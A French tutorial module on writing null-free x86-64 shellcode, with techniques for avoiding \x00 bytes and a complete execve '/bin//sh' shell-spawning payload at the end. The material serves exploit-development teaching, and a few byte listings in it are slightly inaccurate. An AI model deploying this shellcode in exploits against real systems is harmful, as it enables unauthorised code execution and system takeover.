# Module : Null-Free Shellcode

## Objectifs

- Comprendre pourquoi les null bytes posent problème
- Techniques pour éliminer les null bytes
- Transformer du shellcode en null-free

---

## 1. Le problème des null bytes

```
PROBLÈME :
strcpy(buffer, shellcode);  // Arrête au premier \x00 !

SHELLCODE AVEC NULLS :
\x48\xc7\xc0\x00\x00\x00\x01   ; mov rax, 1 (contient \x00\x00\x00)
                               ; TRONQUÉ par strcpy !
```

---

## 2. Techniques d'élimination

### 2.1 XOR pour les petites valeurs

```nasm
; AVEC NULL :
mov rax, 1        ; 48 c7 c0 01 00 00 00 (contient des nulls)

; SANS NULL :
xor rax, rax      ; 48 31 c0 (RAX = 0)
inc rax           ; 48 ff c0 (RAX = 1)

; ou
xor eax, eax      ; 31 c0
mov al, 1         ; b0 01
```

### 2.2 Utiliser des registres partiels

```nasm
; Au lieu de :
mov rdi, 0        ; Contient des nulls

; Utiliser :
xor rdi, rdi      ; Pas de null
xor edi, edi      ; Plus court, pas de null
```

### 2.3 PUSH et POP pour les valeurs

```nasm
; Au lieu de :
mov rdi, 0x68732f6e69622f    ; Peut avoir des nulls

; Utiliser push imm32 + manipulation
push 0x68732f2f               ; "//sh"
mov rdi, rsp
```

### 2.4 Encodage des strings

```nasm
; String "/bin/sh" = 2f 62 69 6e 2f 73 68 00 (null à la fin!)

; Solution : XOR encode puis décoder
; "/bin/sh" XOR 0xFF = d0 9d 96 91 d0 8c 97
; Puis XOR avec 0xFF pour récupérer
```

---

## 3. Exemple complet

```nasm
; Shellcode execve null-free
BITS 64

xor rsi, rsi          ; 48 31 f6
mul rsi               ; 48 f7 e6 (RAX = RDX = 0)
push rax              ; 50
mov rdi, 0x68732f2f6e69622f  ; hs//nib/
push rdi              ; 57
push rsp              ; 54
pop rdi               ; 5f
mov al, 59            ; b0 3b
syscall               ; 0f 05
```

---

## Vérification

```bash
# Vérifier l'absence de nulls
xxd shellcode.bin | grep " 00 "
# Doit ne rien retourner
```
